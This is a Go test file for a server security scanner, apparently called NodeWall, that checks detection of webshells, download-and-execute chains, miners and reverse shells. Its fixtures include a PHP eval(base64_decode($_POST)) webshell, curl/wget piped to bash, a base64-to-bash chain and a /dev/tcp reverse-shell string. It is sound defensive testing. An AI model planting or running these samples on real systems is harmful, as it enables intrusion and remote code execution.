package securityscan

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestScanFindsBuiltInScriptIndicators(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "uploads", "shell.php")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("<?php eval(base64_decode($_POST['x'])); ?>"), 0o644); err != nil {
		t.Fatal(err)
	}

	report, err := New().Scan(context.Background(), root, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) != 1 || report.Findings[0].Rule != "webshell" {
		t.Fatalf("unexpected findings: %#v", report.Findings)
	}
	if report.Findings[0].SHA256 == "" || report.FilesScanned != 1 {
		t.Fatalf("expected hash and file count: %#v", report)
	}
}

func TestOversizedFilesAreSkippedNotCountedAsScanned(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "large.txt"), []byte(strings.Repeat("x", 100)), 0o600); err != nil {
		t.Fatal(err)
	}
	scanner := New()
	scanner.MaxFileSize = 10
	report, err := scanner.Scan(context.Background(), root, nil)
	if err != nil {
		t.Fatal(err)
	}
	if report.FilesScanned != 0 || report.FilesSkipped != 1 || report.ReadErrors != 0 || report.BytesScanned != 0 || !report.Truncated {
		t.Fatalf("oversized file was reported as checked: %#v", report)
	}
}

func TestScannerDetectsContentAfterFourMiBAndAcrossChunkBoundary(t *testing.T) {
	path := filepath.Join(t.TempDir(), "large.php")
	data := []byte(strings.Repeat(" ", 5<<20))
	copy(data[(4<<20)+(64<<10)-5:], "<?php eval(base64_decode($_POST['x'])); ?>")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) != 1 || report.Findings[0].Rule != "webshell" || report.BytesScanned != uint64(len(data)) {
		t.Fatalf("file tail or chunk-boundary signature was missed: %#v", report)
	}
}

func TestOrdinaryDownloadAndServiceCommandsDoNotTriggerHighRisk(t *testing.T) {
	for _, sample := range []string{"curl -I https://example.invalid/health", "wget https://example.invalid/archive.tar.gz", "systemctl enable nginx", "LD_PRELOAD=/usr/lib/libexample.so program"} {
		if rule, _, _ := detect(sample, "/opt/admin.sh", 0o600); rule != "" {
			t.Errorf("ordinary command flagged: %q => %s", sample, rule)
		}
	}
	for _, sample := range []string{"curl https://example.invalid/install | bash", "wget -qO- https://example.invalid/install|sh", "echo aaa | base64 -d | bash"} {
		if rule, severity, _ := detect(sample, "/opt/admin.sh", 0o600); rule != "download-and-execute" || severity != SeverityHigh {
			t.Errorf("execution chain missed: %q => %s", sample, rule)
		}
	}
}

func TestPipeDetectionIgnoresRegexAlternatives(t *testing.T) {
	sample := `#!/bin/bash
excluded_mounts="/dev/loo|tmpfs|udev|overlay|shm|none"
curl -sS https://example.invalid/health
`
	if rule, _, _ := detect(sample, "/opt/monitor_disk.sh", 0o755); rule != "" {
		t.Fatalf("regex alternatives were treated as a shell pipe: %s", rule)
	}
	for _, sample := range []string{
		"curl https://example.invalid/install | bash",
		"wget -qO- https://example.invalid/install|/bin/sh",
	} {
		if rule, severity, _ := detect(sample, "/tmp/installer.sh", 0o700); rule != "download-and-execute" || severity != SeverityHigh {
			t.Fatalf("shell pipe was missed: %q => %s (%s)", sample, rule, severity)
		}
	}
}

func TestEmbeddedShellStringsInSystemBinariesDoNotTriggerTextRules(t *testing.T) {
	path := filepath.Join(t.TempDir(), "tool")
	data := append([]byte("\x7fELF"), []byte("curl https://example.invalid/install | bash /dev/tcp/127.0.0.1/4444")...)
	if err := os.WriteFile(path, data, 0o755); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) != 0 {
		t.Fatalf("embedded strings in an ELF were treated as shell code: %#v", report.Findings)
	}
}

func TestBinaryMinerDetectionRequiresIndependentRuntimeEvidence(t *testing.T) {
	for name, sample := range map[string]string{
		"security-tool-help": "\x7fELF god-eye detects xmrig minerd stratum+tcp:// pools and worker options",
		"real-miner-signals": "\x7fELF xmrig stratum+tcp randomx hashrate worker-id",
	} {
		path := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(path, []byte(sample), 0o755); err != nil {
			t.Fatal(err)
		}
		report, err := New().Scan(context.Background(), path, nil)
		if err != nil {
			t.Fatal(err)
		}
		if name == "security-tool-help" && len(report.Findings) != 0 {
			t.Fatalf("help text caused a binary miner false positive: %#v", report.Findings)
		}
		if name == "real-miner-signals" && (len(report.Findings) != 1 || report.Findings[0].Rule != "cryptominer") {
			t.Fatalf("strong binary miner evidence was missed: %#v", report.Findings)
		}
	}
}

func TestTextIndicatorsRequireScriptContext(t *testing.T) {
	for _, sample := range []string{
		"README: run curl https://example.invalid/install | bash and enable crontab -e",
		"history: xmrig stratum+tcp randomx hashrate",
	} {
		if rule, _, _ := detect(sample, "/root/.bash_history", 0o600); rule != "" {
			t.Fatalf("non-script text was flagged: %q => %s", sample, rule)
		}
	}
	if rule, severity, _ := detect("curl https://example.invalid/install | bash", "/tmp/installer.sh", 0o600); rule != "download-and-execute" || severity != SeverityHigh {
		t.Fatalf("script indicator was missed: %s (%s)", rule, severity)
	}
}

func TestAutomaticQuarantineRequiresExecutableUserControlledFile(t *testing.T) {
	root := filepath.Join("/tmp", "nodewall-quarantine-test-"+strings.ReplaceAll(t.Name(), "/", "-"))
	if err := os.MkdirAll(root, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(root) })
	regular := filepath.Join(root, "history")
	if err := os.WriteFile(regular, []byte("xmrig stratum+tcp randomx hashrate"), 0o600); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(regular)
	if err != nil {
		t.Fatal(err)
	}
	if quarantineEligible(regular, "cryptominer", info) {
		t.Fatal("read-only history-like file was eligible for automatic quarantine")
	}
	executable := filepath.Join(root, "miner")
	if err := os.WriteFile(executable, []byte("payload"), 0o700); err != nil {
		t.Fatal(err)
	}
	info, err = os.Stat(executable)
	if err != nil {
		t.Fatal(err)
	}
	if !quarantineEligible(executable, "cryptominer", info) {
		t.Fatal("executable user-controlled file was not eligible for quarantine")
	}
	rootScript := "/root/auto_install.sh"
	if quarantineEligible(rootScript, "loader-persistence", info) {
		t.Fatal("operator-owned root script was eligible for automatic quarantine")
	}
	doc := "/usr/share/doc/example/reverse.sh"
	if quarantineEligible(doc, "reverse-shell", info) {
		t.Fatal("system documentation was eligible for automatic quarantine")
	}
}

func TestNodeWallArtifactsAreSkipped(t *testing.T) {
	root := filepath.Join("/tmp", "nodewall-scanner-test-"+strings.ReplaceAll(t.Name(), "/", "-"))
	if err := os.MkdirAll(root, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(root) })
	artifact := filepath.Join(root, "nodewall_0.1.0_linux_amd64.tar.gz")
	if err := os.WriteFile(artifact, []byte("eval(base64_decode($_POST['x']))"), 0o600); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), root, nil)
	if err != nil {
		t.Fatal(err)
	}
	if report.FilesScanned != 0 || report.FilesSkipped != 1 || len(report.Findings) != 0 {
		t.Fatalf("NodeWall package was not excluded: %#v", report)
	}
}

func TestNodeWallStagingBinaryIsSkipped(t *testing.T) {
	root := filepath.Join("/tmp", "nodewall-rebuilt-test-"+strings.ReplaceAll(t.Name(), "/", "-"), "nodewall_0.1.0_linux_amd64", "bin")
	if err := os.MkdirAll(root, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(filepath.Dir(filepath.Dir(root))) })
	path := filepath.Join(root, "nodewall")
	if err := os.WriteFile(path, []byte("\x7fELF xmrig stratum+tcp randomx hashrate worker-id"), 0o755); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), filepath.Dir(filepath.Dir(root)), nil)
	if err != nil {
		t.Fatal(err)
	}
	if report.FilesScanned != 0 || report.FilesSkipped != 1 || len(report.Findings) != 0 {
		t.Fatalf("NodeWall staging binary was not excluded: %#v", report)
	}
}

func TestNodeWallDeploymentStagingArtifactsAreRecognized(t *testing.T) {
	for _, path := range []string{
		"/opt/nodewall-update-scanfix6/nodewall.new",
		"/opt/nodewall-update-scanfix6/nodewall_0.1.0_linux_amd64/bin/nodewall",
		"/tmp/nodewall-rebuilt/nodewall_0.1.0_linux_amd64/bin/nodewall",
	} {
		if !isNodeWallBuildBinaryPath(path) {
			t.Errorf("NodeWall staging artifact was not recognized: %s", path)
		}
	}
	for _, path := range []string{
		"/opt/nodewall-update-scanfix6/notes.txt",
		"/opt/nodewall-update-scanfix6/nodewall.new.bak",
		"/opt/third-party/nodewall",
		"/usr/local/bin/nodewall",
	} {
		if isNodeWallBuildBinaryPath(path) {
			t.Errorf("unrelated path was recognized as a NodeWall staging artifact: %s", path)
		}
	}
}

func TestDeletedNodeWallExecutableIsTrusted(t *testing.T) {
	for _, path := range []string{
		"/opt/nodewall/bin/nodewall (deleted)",
		"/etc/nodewall/nodewall.env (deleted)",
		"/var/lib/nodewall/scan-reports/scan.json (deleted)",
	} {
		if !isNodeWallTrustedPath(path) {
			t.Errorf("deleted NodeWall path was not trusted: %s", path)
		}
	}
}

func TestReadErrorsAndCancellationDoNotReportCompleteCoverage(t *testing.T) {
	root := t.TempDir()
	for _, name := range []string{"a.txt", "z.txt"} {
		if err := os.WriteFile(filepath.Join(root, name), []byte("benign"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	report, err := New().Scan(context.Background(), root, func(p Progress) {
		if p.FilesScanned == 1 {
			_ = os.Remove(filepath.Join(root, "z.txt"))
		}
	})
	if err != nil || report.ReadErrors != 1 || report.FilesScanned != 1 || !report.Truncated {
		t.Fatalf("read error was hidden: %#v %v", report, err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := New().Scan(ctx, root, nil); err == nil {
		t.Fatal("cancellation ignored")
	}
}

func TestScanSkipsVirtualSystemDirectoriesWhenScanningRoot(t *testing.T) {
	if _, err := ValidateRoot("relative/path"); err == nil {
		t.Fatal("expected relative path to be rejected")
	}
	if _, err := ValidateRoot("/path/that/does/not/exist"); err == nil {
		t.Fatal("expected missing path to be rejected")
	}
}

func TestContainerStorageIsReservedForExplicitScans(t *testing.T) {
	for _, path := range []string{
		"/var/lib/docker",
		"/var/lib/docker/aufs/diff",
		"/var/lib/containerd",
		"/var/lib/kubelet",
		"/var/lib/rancher",
	} {
		if !isContainerStorageDirectory(path) {
			t.Errorf("container storage path was not recognized: %s", path)
		}
	}
	for _, path := range []string{"/var/lib/nodewall", "/var/lib/postgresql", "/srv/app"} {
		if isContainerStorageDirectory(path) {
			t.Errorf("unrelated path was treated as container storage: %s", path)
		}
	}
}

func TestExplicitSymlinkRootResolvesToScannedTarget(t *testing.T) {
	root := t.TempDir()
	target := filepath.Join(root, "shell.php")
	if err := os.WriteFile(target, []byte("<?php eval(base64_decode($_POST['x'])); ?>"), 0o600); err != nil {
		t.Fatal(err)
	}
	alias := filepath.Join(root, "alias.php")
	if err := os.Symlink(target, alias); err != nil {
		t.Fatal(err)
	}
	report, err := New().Scan(context.Background(), alias, nil)
	if err != nil || report.FilesScanned != 1 || len(report.Findings) != 1 {
		t.Fatalf("explicit symlink target was silently skipped: %#v %v", report, err)
	}
}
